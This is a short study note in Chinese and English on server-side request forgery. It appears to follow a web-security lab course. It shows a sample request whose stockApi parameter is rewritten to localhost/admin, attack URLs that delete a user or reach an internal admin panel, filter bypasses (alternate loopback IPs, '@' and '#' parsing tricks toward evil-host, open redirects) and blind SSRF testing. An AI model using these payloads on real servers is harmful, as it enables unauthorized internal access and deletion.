# Server-side request forgery (SSRF)
- 使伺服器連接到組織基礎架構內僅供內部存取的服務
- 強制伺服器連接到任意外部系統
- 洩露敏感數據，例如授權憑證
- 導致未經授權的操作或存取組織內的資 <br >

**Example :**
- 後端 REST API : 前端 HTTP 請求將 URL 傳遞到相關的後端 API 端點
- POST /product/stock HTTP/1.0
- Content-Type: application/x-www-form-urlencoded
- Content-Length: 118
- stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
- => stockApi=http://localhost/admin

**Attacks :**
- Behavior : http://localhost/admin/delete?username=carlos
- Back-end admin : http://192.168.0.&&:8080/admin

## Bypass (SSRF 過濾器)
- 輸入過濾器(blcak-list)
  - 替代 IP : 127.0.0.1 (2130706433, 017700000001, or 127.1.)
  - 使用 URL 編碼或大小寫變化來混淆被阻止的字串
- 輸入過濾器(white-list)
  - URL 解析不一致 (@,#)
    - https://expected-host:fakepassword@evil-host
    - https://evil-host#expected-host
  - DNS 命名層次結構
    - https://expected-host.evil-host
- 開放重定向 redirect

## Blind SSRF vulnerabilities
- will have 遠端程式碼執行
- Burp Collaborator
- using out-of-band (OAST) testing
- 用 Burp Collaborator 生成唯一的域名，將其作為有效載荷發送到應用程序
- 盲目掃描內部 IP 位址空間，發送旨在偵測已知漏洞的有效載荷
- 誘導應用程式連接到攻擊者控制的系統，並向建立連接的 HTTP 用戶端傳回惡意回應

## 隱藏攻擊面
- 請求中的部分 URL : path=https://xxxxxxx
- 資料格式中的 URL : XML 格式的資料 ( XXE 注入)
- Referer header
  
## Lab: Blind SSRF with out-of-band detection
